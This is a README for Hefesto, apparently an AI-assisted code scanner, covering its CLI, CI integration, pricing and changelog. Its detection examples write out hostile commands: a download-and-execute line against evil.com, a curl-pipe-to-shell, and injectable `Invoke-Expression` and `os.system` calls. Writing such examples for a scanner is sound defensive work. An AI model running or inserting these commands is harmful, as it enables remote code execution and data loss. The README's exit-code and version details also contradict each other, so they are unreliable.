# Hefesto - AI-Powered Code Quality Guardian

[![PyPI version](https://badge.fury.io/py/hefesto-ai.svg)](https://pypi.org/project/hefesto-ai/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Languages](https://img.shields.io/badge/languages-21-green.svg)](https://github.com/artvepa80/Agents-Hefesto)

**Multi-language AI code analysis for 7 programming languages + 10 DevOps/config formats + 4 Cloud formats.**

Hefesto validates your code before production using AI-powered static analysis and ML enhancement. It caught 3 critical bugs in its own v4.0.1 release through self-validation.

---

## What is Hefesto?

Hefesto analyzes code using AI and catches issues that traditional linters miss:

| Feature | Description |
|---------|-------------|
| **Code Languages (7)** | Python, TypeScript, JavaScript, Java, Go, Rust, C# |
| **DevOps/Config (10)** | Dockerfile, Jenkins/Groovy, JSON, Makefile, PowerShell, Shell, SQL, Terraform, TOML, YAML |
| **AI Analysis** | Google Gemini for semantic code understanding |
| **Security Scanning** | SQL injection, hardcoded secrets, command injection |
| **Code Smells** | Long functions, deep nesting, high complexity |
| **Pre-Push Hooks** | Automatic validation before every git push |
| **REST API** | 8 endpoints for CI/CD integration |

---

## Quick Start (60 seconds)

```bash
# 1. Install
pip install hefesto-ai

# 2. Verify
hefesto --version  # Should show: 4.9.0

# 3. Analyze
cd your-project
hefesto analyze . --severity HIGH

## GitHub Action

Run Hefesto directly in your CI/CD pipeline without installing Python dependencies using our Docker-based Action:

````markdown
```yaml
steps:
  - uses: actions/checkout@v4
  - name: Run Hefesto Guardian
    id: hefesto
    uses: artvepa80/Agents-Hefesto@v4.9.0
    with:
      target: '.'
      fail_on: 'CRITICAL'
      min_severity: 'MEDIUM'
      format: 'table'
```
````

**Inputs**:

| Input | Description | Default |
|-------|-------------|---------|
| `target` | Path to analyze (file or directory) | `.` |
| `fail_on` | Exit with error if issues found at or above this severity level | `CRITICAL` |
| `min_severity` | Minimum severity to report | `LOW` |
| `format` | Output format (`text`, `json`, `html`) | `text` |
| `telemetry` | Opt-in to anonymous telemetry (1=enable) | `0` |

**Outputs**:

| Output | Description |
|--------|-------------|
| `exit_code` | The exit code of the CLI (0=Success, 1=Error, 2=Issues Found) |


### Example: What Hefesto Catches

**PowerShell** (PS001-PS006):
```powershell
Invoke-Expression $userInput  # Command injection
curl https://evil.com | iex   # Download+execute
$password = "admin123"         # Hardcoded secret
```

**JSON** (J001-J005):
```json
{
  "db_password": "prod123",  # Hardcoded secret
  "url": "http://internal"   # Insecure HTTP
}
```

**Makefile** (MF001-MF005):
```makefile
deploy:
\tcurl -k https://api | sh  # TLS bypass + pipe to shell
```

**Output**:
```
Files analyzed: 15 | Issues: 8
  Critical: 2  (Hardcoded secrets)
  High: 5      (Security risks)
  Medium: 1    (Code smells)
```

---

## Language Support

### Code Languages

| Language | Parser | Status |\n|----------|--------|--------|
| Python | Native AST | Full support |
| TypeScript | TreeSitter | Full support |
| JavaScript | TreeSitter | Full support |
| Java | TreeSitter | Full support |
| Go | TreeSitter | Full support |
| Rust | TreeSitter | Full support |
| C# | TreeSitter | Full support |

### DevOps & Configuration (Ola 1 & 2)

| Format | Analyzer | Rules | Status |
|--------|----------|-------|--------|
| **YAML** | YamlAnalyzer | Generic YAML security | ✅ v4.4.0 |
| **Terraform** | TerraformAnalyzer | TfSec-aligned rules | ✅ v4.4.0 |
| **Shell** | ShellAnalyzer | ShellCheck-aligned | ✅ v4.4.0 |
| **Dockerfile** | DockerfileAnalyzer | Hadolint-aligned | ✅ v4.4.0 |
| **SQL** | SqlAnalyzer | SQL Injection prevention | ✅ v4.4.0 |
| **PowerShell** | PS001-PS006 | 6 security rules | ✅ v4.5.0 |
| **JSON** | J001-J005 | 5 security rules | ✅ v4.5.0 |
| **TOML** | T001-T003 | 3 security rules | ✅ v4.5.0 |
| **Makefile** | MF001-MF005 | 5 security rules | ✅ v4.5.0 |
| **Groovy** | GJ001-GJ005 | 5 security rules | ✅ v4.5.0 |

### Cloud Infrastructure (Ola 4)

| Format | Analyzer | Focus | Status |
|--------|----------|-------|--------|
| **CloudFormation** | CloudFormationAnalyzer | AWS IaC Security | ✅ v4.7.0 |
| **ARM Templates** | ArmAnalyzer | Azure IaC Security | ✅ v4.7.0 |
| **Helm Charts** | HelmAnalyzer | Kubernetes Security | ✅ v4.7.0 |
| **Serverless** | ServerlessAnalyzer | Serverless Framework | ✅ v4.7.0 |

**Total**: 7 code languages + 10 DevOps formats + 4 Cloud formats = **21 supported formats**

### TypeScript/JavaScript Analysis (v4.3.3)

- **Arrow function naming**: Infers names from `const foo = () => {}`
- **Accurate parameter counting**: Uses AST formal_parameters, not comma counting
- **Method detection**: Handles Express routes, callbacks, class methods
- **Threshold visibility**: Shows `(13 lines, threshold=10)` in all messages

---

## Features by Tier

| Feature | FREE | PRO ($15/mo)* | OMEGA ($30/mo) |
|---------|------|---------------|----------------|
| Static Analysis | Yes | Yes | Yes |
| Security Scanning | Basic | Advanced | Advanced |
| Pre-push Hooks | Yes | Yes | Yes |
| 7 Language Support | Yes | Yes | Yes |
| ML Enhancement | No | Yes | Yes |
| REST API | No | Yes | Yes |
| BigQuery Analytics | No | Yes | Yes |
| IRIS Monitoring | No | No | Yes |
| Production Correlation | No | No | Yes |
| Repos/LOC | Limited | Unlimited | Unlimited |

*\*Early Adopter pricing (first 100 users). Standard price $30/mo.*

- **PRO**: [Start Free Trial](https://buy.stripe.com/4gM00i6jE6gV3zE4HseAg0b) - $15/month
- **OMEGA**: [Start Free Trial](https://buy.stripe.com/14A9AS23o20Fgmqb5QeAg0c) - $30/month

14-day free trial, no credit card required.

---

## Installation

```bash
# FREE tier
pip install hefesto-ai

# PRO tier
pip install hefesto-ai[pro]
export HEFESTO_LICENSE_KEY="your-key"

# OMEGA Guardian
pip install hefesto-ai[omega]
export HEFESTO_LICENSE_KEY="your-key"
```

---

## CLI Commands

```bash
# Analyze code
hefesto analyze <path>
hefesto analyze . --severity HIGH
hefesto analyze . --output json

# Check status
hefesto status

# Install/update git hook
hefesto install-hooks

# Start API server (PRO)
hefesto serve --port 8000

# Telemetry Management
hefesto telemetry status
hefesto telemetry clear
```

---

## Pre-Push Hook

Automatic validation before every `git push`:

```bash
# Install/update hook (copies scripts/git-hooks/pre-push → .git/hooks/pre-push)
hefesto install-hooks

# Update an existing hook
hefesto install-hooks --force

# Bypass temporarily
SKIP_HEFESTO_HOOKS=1 git push
```

The hook runs two gates:

1. **Security gate** — `hefesto analyze` with `--fail-on CRITICAL --exclude-types VERY_HIGH_COMPLEXITY,LONG_FUNCTION` (blocks security issues, ignores complexity debt)
2. **Fast lint/test gate** — Black, isort, Flake8, and a minimal test suite

> **Note:** Hooks are local to your machine and not committed to git. Run `hefesto install-hooks` after cloning or whenever `scripts/git-hooks/pre-push` is updated.

---

## What Hefesto Catches

### Code Quality

| Issue | Severity | Description |
|-------|----------|-------------|
| LONG_FUNCTION | MEDIUM | Functions > 50 lines |
| HIGH_COMPLEXITY | HIGH | Cyclomatic complexity > 10 |
| DEEP_NESTING | HIGH | Nesting depth > 4 levels |
| LONG_PARAMETER_LIST | MEDIUM | Functions with > 5 parameters |
| GOD_CLASS | HIGH | Classes > 500 lines |

### Security

| Issue | Severity | Description |
|-------|----------|-------------|
| HARDCODED_SECRET | CRITICAL | API keys, passwords in code |
| SQL_INJECTION_RISK | HIGH | String concatenation in queries |
| COMMAND_INJECTION | HIGH | Unsafe shell command execution |
| PATH_TRAVERSAL | HIGH | Unsafe file path handling |
| UNSAFE_DESERIALIZATION | HIGH | pickle, yaml.unsafe_load |

### Example Fixes

```python
# Hefesto catches:
password = "admin123"  # HARDCODED_SECRET
query = f"SELECT * FROM users WHERE id={id}"  # SQL_INJECTION_RISK
os.system(f"rm {user_input}")  # COMMAND_INJECTION

# Hefesto suggests:
password = os.getenv("PASSWORD")
cursor.execute("SELECT * FROM users WHERE id=?", (id,))
subprocess.run(["rm", user_input], check=True)
```

---

## REST API (PRO)

```bash
# Start server (binds to 127.0.0.1 by default)
hefesto serve --port 8000

# Analyze code
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $HEFESTO_API_KEY" \
  -d '{"code": "def test(): pass", "severity": "MEDIUM"}'
```

### API Security (v4.8.0)

The API server is **secure by default**:

| Feature | Default | Configure via |
|---------|---------|---------------|
| Host binding | `127.0.0.1` (loopback) | `HEFESTO_API_HOST` |
| CORS | Localhost only | `HEFESTO_CORS_ORIGINS` |
| API docs | **Disabled** (404) | `HEFESTO_EXPOSE_DOCS=true` |
| Auth | Off (no key set) | `HEFESTO_API_KEY` |
| Rate limit | 60 req/min | `HEFESTO_RATE_LIMIT_PER_MINUTE` |
| Path sandbox | `cwd()` | `HEFESTO_WORKSPACE_ROOT` |

```bash
# Production example
export HEFESTO_API_KEY=my-secret-key
export HEFESTO_CORS_ORIGINS=https://app.example.com
export HEFESTO_API_RATE_LIMIT_PER_MINUTE=60
export HEFESTO_EXPOSE_DOCS=false
hefesto serve --host 0.0.0.0 --port 8000
```

### Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/analyze` | POST | Analyze code |
| `/health` | GET | Health check (no auth required) |
| `/ping` | GET | Fast health ping (no auth required) |
| `/batch` | POST | Batch analysis |
| `/metrics` | GET | Quality metrics |
| `/history` | GET | Analysis history |
| `/webhook` | POST | GitHub webhook |
| `/stats` | GET | Statistics |
| `/validate` | POST | Validate without storing |

---

## CI/CD Integration

### GitHub Actions

```yaml
name: Hefesto

on: [push, pull_request]

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install Hefesto
        run: pip install hefesto-ai
      - name: Run Analysis
        run: hefesto analyze . --severity HIGH
```



### GitLab CI

```yaml
hefesto:
  stage: test
  script:
    - pip install hefesto-ai
    - hefesto analyze . --severity HIGH
```

---

## Configuration

### Environment Variables

```bash
# Core
export HEFESTO_LICENSE_KEY="your-key"
export HEFESTO_SEVERITY="MEDIUM"
export HEFESTO_OUTPUT="json"

# API Security (v4.7.0)
export HEFESTO_API_KEY="your-api-key"                # Enable API key auth
export HEFESTO_API_RATE_LIMIT_PER_MINUTE=60           # Enable rate limiting
export HEFESTO_CORS_ORIGINS="https://app.example.com" # Restrict CORS
export HEFESTO_EXPOSE_DOCS=true                       # Enable /docs, /redoc
export HEFESTO_WORKSPACE_ROOT="/srv/code"              # Path sandbox root
export HEFESTO_CACHE_MAX_ITEMS=256                     # Cache size limit
export HEFESTO_CACHE_TTL_SECONDS=300                   # Cache entry TTL
```

### Config File (.hefesto.yaml)

```yaml
severity: HIGH
exclude:
  - tests/
  - node_modules/
  - .venv/

rules:
  complexity:
    max_cyclomatic: 10
    max_cognitive: 15
  security:
    check_secrets: true
    check_injections: true
```

---

## OMEGA Guardian

Production monitoring that correlates code issues with production failures.

### Features

- **IRIS Agent**: Real-time production monitoring
- **Auto-Correlation**: Links code changes to incidents
- **Real-Time Alerts**: Pub/Sub notifications
- **BigQuery Analytics**: Track correlations over time

### Setup

```yaml
# iris_config.yaml
project_id: your-gcp-project
dataset: omega_production
pubsub_topic: hefesto-alerts

alert_rules:
  - name: error_rate_spike
    threshold: 10
  - name: latency_increase
    threshold: 1000
```

```bash
# Run IRIS Agent
python -m hefesto.omega.iris_agent --config iris_config.yaml

# Check status
hefesto omega status
```

---

## The Dogfooding Story

We used Hefesto to validate itself before publishing v4.0.1:

**Critical bugs found:**
1. Hardcoded password in test fixtures (CRITICAL)
2. Dangerous `exec()` call without validation (HIGH)
3. 155 other issues (code smells, security, complexity)

**Result:** All fixed before shipping. Meta-validation at its finest.

---

## Changelog

### v4.9.0 (2026-02-14)
- **Boundary**: Public/private repo split — community edition only in public repo.
- **Removed**: Paid modules (api, llm, licensing, omega), paid infra, paid tests.
- **Hardened**: Packaging (packages.find exclude, MANIFEST.in prune, CI guard).
- **Added**: `scripts/guard_public_repo.py` — CI boundary enforcement.
- **Stubbed**: Paid CLI commands (serve, info, activate, deactivate, status).

### v4.8.7 (2026-02-14)
- **Docs**: Version alignment across MEMORY.md, README, CHANGELOG.
- **Release**: Clean auditable closeout tag after PR #5 merge cycle.

### v4.8.6 (2026-02-13)
- **Security**: Force-tracked `critical_secret.py` fixture for CI runners.
- **CI**: All 8 checks green (3.10/3.11/3.12 + parity + smoke + deploy).
- **Dogfooding**: 0 CRITICAL issues verified before release.

### v4.8.5 (2026-02-13)
- **GitHub Action**: Market-ready Docker-based action (bypassing PyPI).
- **Security**: Deterministic smoke tests with clean/critical fixtures.
- **CLI**: Verified exit code contract (2 = Issues Found).
- **Fix**: Input normalization in `action_entrypoint.sh`.

### v4.8.3 (2026-02-12)
- **Patch W: Security Fixes**
- **Critical**: Eliminated SQL injection vulnerabilities in BigQuery service via parameterized queries
- **Patch X: Infrastructure**: Resolved dependency submission flakiness by transitioning to GitHub's native "Automatic Dependency Submission"

### v4.8.2 (2026-02-12)
- **Patch V: CI & Deployment Fixes**
- **Critical Fix**: CLI exit code logic (now correctly returns 2 on failure)
- **Fix**: Cloud Run port binding and MyPy type safety hardening

### v4.7.0 (2026-02-10)
- **Patch C: API Hardening** — `hefesto serve` is secure-by-default (local-first)
- **Security**: API key auth, CORS allowlist, docs toggle, path sandbox
- **Reliability**: Rate limiting, cache guardrails to prevent DoS
- **Deployment**: Migrated to Workload Identity Federation (keyless) & Docker build
- **Fixed**: Restored `/ping` endpoint (unauthenticated)

### v4.6.0 (2026-02-09)
- Ola 3 Infrastructure & CI Guardrails
- Capabilities matrix, CI parity enforcement, README verification

### v4.3.3 (2025-12-26)
- Fix LONG_PARAMETER_LIST: use AST formal_parameters instead of comma counting
- Fix function naming: infer names from variable_declarator for arrow functions
- Add threshold values to all code smell messages
- Add line ranges to LONG_FUNCTION suggestions
- Use `<anonymous>` instead of `None` for unnamed functions

### v4.3.2 (2025-12-26)
- Complete multi-language support for all 7 languages
- Fix TreeSitter grammar loading with tree-sitter-languages
- Add Rust and C# parser support

### v4.3.1 (2025-12-25)
- Fix license validation for OMEGA tier
- Fix CLI handling of unlimited values

### v4.2.1 (2025-10-31)
- Critical tier hierarchy bugfix
- OMEGA Guardian release

---

## Support

- **Email**: support@narapallc.com
- **GitHub Issues**: [Open an issue](https://github.com/artvepa80/Agents-Hefesto/issues)
- **PRO/OMEGA**: Priority support via email

---


## CLI Reference (v4.9.2)

### JSON Output
```bash
hefesto analyze . --output json          # stdout = pure JSON, banners → stderr
hefesto analyze . --output json 2>/dev/null | jq .  # pipe-safe
```

### Exit Codes
| Code | Meaning |
|------|---------|
| `0`  | Analysis complete (no `--fail-on`, or threshold not breached) |
| `1`  | Gate failure (`--fail-on` threshold breached) or runtime error |

### Gate Examples
```bash
hefesto analyze . --fail-on high         # exit 1 if HIGH+ found
hefesto analyze . --fail-on critical     # exit 1 only if CRITICAL found
hefesto analyze .                        # always exit 0 (report only)
```

## License

MIT License for core functionality. PRO and OMEGA features are licensed separately.

---

**Hefesto: AI-powered code quality that caught 3 critical bugs in its own release.**

© 2025 Narapa LLC, Miami, Florida
